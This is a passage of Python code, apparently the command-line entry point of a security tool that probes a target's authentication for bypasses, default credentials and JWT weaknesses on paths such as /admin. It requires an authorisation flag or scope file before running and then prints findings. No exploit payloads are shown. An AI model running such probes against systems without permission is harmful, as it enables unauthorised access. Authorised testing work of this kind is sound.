    parser.add_argument("login_url",   nargs="?", default=None, help="Login endpoint for default-creds probe (optional)")
    parser.add_argument(
        "--i-am-authorized", dest="authorized", action="store_true", default=False,
        help="Confirm you have explicit authorisation to probe this target.",
    )
    parser.add_argument(
        "--allow-public", dest="allow_public", action="store_true", default=False,
        help="Allow probing public IPs (requires --i-am-authorized).",
    )
    parser.add_argument(
        "--scope-file", dest="scope_file", default=None, metavar="FILE",
        help="Path to a scope.json file (grants authorisation if 'authorized: true' is set).",
    )
    args = parser.parse_args()

    # Load scope file if provided
    scope = None
    if args.scope_file:
        from creep_gate import load_scope_file, ScopeError as _SE
        try:
            scope = load_scope_file(args.scope_file)
            args.authorized   = args.authorized   or bool(scope.get("authorized",   False))
            args.allow_public = args.allow_public or bool(scope.get("allow_public", False))
        except _SE as e:
            print(f"\n[creep-auth] ERROR: {e}\n")
            raise SystemExit(1)

    if not args.authorized:
        print("\n[creep-auth] ERROR: Active auth probing requires explicit authorisation.")
        print("  Add --i-am-authorized or use --scope-file scope.json with 'authorized: true'.")
        print("  Only probe systems you own or have written permission to test.\n")
        raise SystemExit(1)

    print(f"\n[creep-auth] Target: {args.target}")
    print("=" * 60)
    print("  !! ACTIVE PROBE — authorisation confirmed !!")
    print("=" * 60 + "\n")

    results, findings = run_auth_scan(
        args.target,
        jwt_token=args.jwt_token,
        login_url=args.login_url,
        protected_paths=["/admin", "/api/admin", "/internal"],
        authorized=args.authorized,
        allow_public=args.allow_public,
        scope=scope,
        progress_cb=lambda m: print(f"  {m}"),
    )

    bypassed = [r for r in results if r.bypassed]

    print(f"\n{'─'*60}")
    print(f"  Probes run   : {len(results)}")
    print(f"  Bypasses     : {len(bypassed)}")
    print(f"  Findings     : {len(findings)}")
    print(f"{'─'*60}\n")

    for f in findings:
        print(f"[{f.severity.value:<8}] {f.title}")
        print(f"           Target  : {f.target}")
        print(f"           Detail  : {f.detail}")
        print(f"           Evidence: {f.evidence}")
        print()
